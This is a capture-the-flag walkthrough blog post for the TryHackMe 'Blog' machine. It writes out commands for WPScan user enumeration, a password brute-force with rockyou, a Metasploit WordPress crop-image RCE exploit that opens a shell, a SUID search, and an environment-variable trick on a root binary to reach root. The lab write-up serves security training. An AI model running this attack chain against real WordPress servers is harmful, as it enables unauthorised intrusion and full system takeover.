<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Blog TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/blog-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-23T13:34:32+00:00">May 23, 2021</time><time class="updated" datetime="2025-06-24T10:34:41+00:00">June 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Blog”. It is available at TryHackMe for penetration testing practice. The challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The credit for making this machine goes to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></strong></span>. The breakdown of the Machine with the redacted flags is as follow:</span></p>
<p><span style="color: #000000;">Level: Medium</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning </strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Adding Hosts</span></li>
<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
<li><span style="color: #000000;">Enumerating with WPScan</span></li>
<li><span style="color: #000000;">Creating User Dictionary</span></li>
<li><span style="color: #000000;">Bruteforce Credentials using WPScan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation </strong></span>
<ul>
<li><span style="color: #000000;">Exploiting RCE on WordPress</span></li>
<li><span style="color: #000000;">Enumerating Documents</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating SUID Permissions</span></li>
<li><span style="color: #000000;">Reverse Engineer Binary using Ghidhra</span></li>
<li><span style="color: #000000;">Exporting Environment Variable for admin</span></li>
<li><span style="color: #000000;">Running checker binary</span></li>
<li><span style="color: #000000;">Getting Root Flag</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
<li><span style="color: #000000;">Enumerating User Flag</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">There are two flags in this machine to discover. After Booting up the target machine from the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/room/blog">TryHackMe: Blog CTF Page</a></strong></span>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.109.33</strong></span></p>
<p><span style="color: #000000;">Apart from the two flags, three questions are required as well to complete this machine. You can find the questions as the answers are discovered below.</span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We will start a nmap scan with the -sC for Default Scripts and -sV for Scanning Versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.10.109.33</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jXlAfqlQX9s/YKpUKxotpZI/AAAAAAAAwAk/Mqm9xOZ6LXUbERYkZI3kBQJp6Z0H_CbsgCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Nmap was able to identify 3 services running on the target machine. It included SSH (22), HTTP (80), and SMB (139, 445).</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We didn’t have any credentials for logging in through SSH hence, we tied to enumerate the HTTP service. We found that it is not possible to properly enumerate the web page without adding the entry in our hosts file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.10.109.33 blog.thm</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EdzVvwnCa18/YKpXGTrVsBI/AAAAAAAAwAs/PwrtF8xQfJIm2sXPZtj0453bn7BDabbwQCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">After adding the IP address of the target machine with the blog.thm in the hosts file, we tried to enumerate the web page by opening it in a Browser. This looked like a simple blog. From the general looks of it, it seemed like a WordPress Application.</span></p>
<h5><span style="color: #000000;"><strong><em>What CMS was Billy using?</em></strong></span></h5>
<p><span style="color: #000000;"><strong><em>WordPress</em></strong></span></p>
<p><span style="color: #000000;"><strong>http://blog.thm/</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-noM19st_Oeo/YKpXKQKkGOI/AAAAAAAAwAw/KDOUkpxIwrYE1VpxisMD9cFi1cfkprxdQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Then, we used the WPScan on the application in the enumeration mode to extract the various plugins, users, and other possible information.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan --url http://blog.thm/ -e</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nrWHwEPqb7g/YKpXOQS3BBI/AAAAAAAAwA0/LAkKtah206gSViZzLzrSsS_iSA_-dIKyACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">The WPScan was able to extract some users such as kwheel, bjoel, Karen Wheeler, Billy Joel. These users will not be used to Bruteforce the login on the application.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vmjFx1j-WfM/YKpXWdwgoKI/AAAAAAAAwA8/I5TGyADxwVYjJEo-WUB2MHzk__a1FMnugCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">To Bruteforce the users on the application, we created a dictionary by the name of user.txt and entered all the usernames that we found earlier.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano user.txt
kwheel
bjoel
Karen Wheeler
Billy Joel</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ndbRiRDtKxY/YKpXbEQ0tmI/AAAAAAAAwBE/q1f8TaesQ20lmiIK1e6RzitK-1LYJ8s3gCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Then we used the WPScan again to Bruteforce the users by providing the usernames in the form of a dictionary.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7ZvBQ_k7_UA/YKpXhNPGiTI/AAAAAAAAwBI/HvdAxtE9EXAL7c-4hcaYcpucZdedHyJ8ACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">After bruteforcing through the XMLRPC, the WPScan was able to extract the credentials for the user kwheel. It was cutiepie1.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fSRqKS33MB0/YKpXlw6DvqI/AAAAAAAAwBQ/8QSDhRQU65UJ8Eacc_bn5fMs_ovxxMg7gCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Many vulnerabilities are available for various versions of WordPress. These vulnerabilities also depend on the plugins that the user has installed as well. One of these vulnerabilities is the Remote Command Execution. We loaded the Metasploit Console and selected the RCE exploit. Then we proceeded to apply the remote host, username, and password. After executing the payload, it generated a metepreter shell that we then converted into a generic shell. We converted the shell into a TTY shell using the python one-liner. The shell that we can achieve is of www-data user.</span></p>
<h5><span style="color: #000000;"><strong><em>What version of the above CMS was being used?</em></strong></span></h5>
<p><span style="color: #000000;"><strong><em>5.0</em></strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/wp_crop_rce
set rhosts 10.10.109.33
set username kwheel
set password cutiepie1
run
shell
python -c 'import pty; pty.spawn("/bin/bash")'
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hnKwA4DVw6U/YKpXrDo210I/AAAAAAAAwBY/4FvFsJtNiYEBUp59QyzqTlMi4wEUF8phgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">After getting the initial foothold, we try to enumerate the user flag. In search of the flag, we traversed into the home directory of the bjoel user. The user.txt file that was located there was a fake one. It also contained a pdf that can be interesting. Using the meterpreter we were able to transfer the pdf file back to the local Kali Linux Machine for further inspection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
ls
cd bjoel
ls
cat user.txt
download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fxS--88_6DE/YKpXyHDcjgI/AAAAAAAAwBg/tKV0WhVYXuM3UezO68Mrr799RBXQPpuPQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Then, upon reading the pdf file, it was found that Bill Joel was employed by Rubber Ducky Inc and was terminated. This might have led him to start writing blogs. The Rubber Ducky seemed like a clue. We will get back to it later down the road.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5FGprHhw0bs/YKpX3ZWHe6I/AAAAAAAAwBo/4BPNmrqxT0E_Yf2GHhqY2dYwUC2055oLgCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Getting back to the system shell from the meterpreter on the target machine, we enumerated possible permissions that could help us elevate privileges on the target machine. This is where we found the checker binary file. It was possible to elevate privilege from www-data to root using this binary.</span></p>
<pre class="EnlighterJSRAW " data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9PLookrmx8E/YKpX7cj9jFI/AAAAAAAAwBw/c3_Wk84j9EgjlSvl15M80WrmYu0nLkkzwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Running the checker script for the first time reveals that it tests if the user that runs the command is root or not. If not, it gives back the message “Not an Admin”. Since it is a compiled binary to inspect it, we transferred the binary to our local Kali Linux Machine for further inspection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/sbin/checker
download /usr/sbin/checker</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JfO4Trke0vE/YKpYA-QTCHI/AAAAAAAAwB0/_BKaNsV8OBUH3p_bNdkR-0ZtxvhMu_VuACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">In Kali Linux, we ran the Reverse Engineering tool: Ghidhra and created a project inside it. Then we loaded the binary into the project and ran an analysis. After the analysis, we tried to locate the main function inside the code. Then, we were able to identify the current main function with the entry points as depicted below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-G-99noqzr1w/YKpYF7TLeWI/AAAAAAAAwB4/KmgKwoWk5rUog1IlP34IJmOiJUn5yxVoQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Upon inspecting the code inside the main function, you can see that the code declares a variable that checks the Environment Variable for the value of admin. If the admin is not assigned a value, the code returns the string “Not an Admin” to the user. But if it can detect a value for the admin then it proceeds to invoke the bash shell. Since this binary can run with root-level privileges, the bash shell it invokes is of the root user itself.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bj_KGiMNgbE/YKpYKUz1fQI/AAAAAAAAwCA/V15by35QtxM09NTE84tWG8WXGhmp0KCLQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">After getting the understanding from the code, we exported pavan to the admin variable. You can export a value to the admin variable as long as it is a string. Then we run the checker binary and we are provided with the root shell. Then we read the root.txt flag. We are not able to locate the user flag until now, but now as root, we can run the find command and try to locate it. When running the find command to locate the user.txt, we find the user.txt in bjoel’s home directory that we located earlier. Then we also see a user.txt inside the media/usb directory. This means that the company name Rubber Ducky Inc was pointing at the USB directory for us to look at.</span></p>
<h5><span style="color: #000000;"><strong><em>Where was user.txt found?</em></strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/media/usb/
export admin=pavan
/usr/sbin/checker
cat /root/root.txt
find / -name "user.txt"
cat /media/usb/user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XpeTFaCaR-U/YKpYPl0QglI/AAAAAAAAwCE/a5y8_xI_YzQNEuSN15yc1orYhSBnH9tnQCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
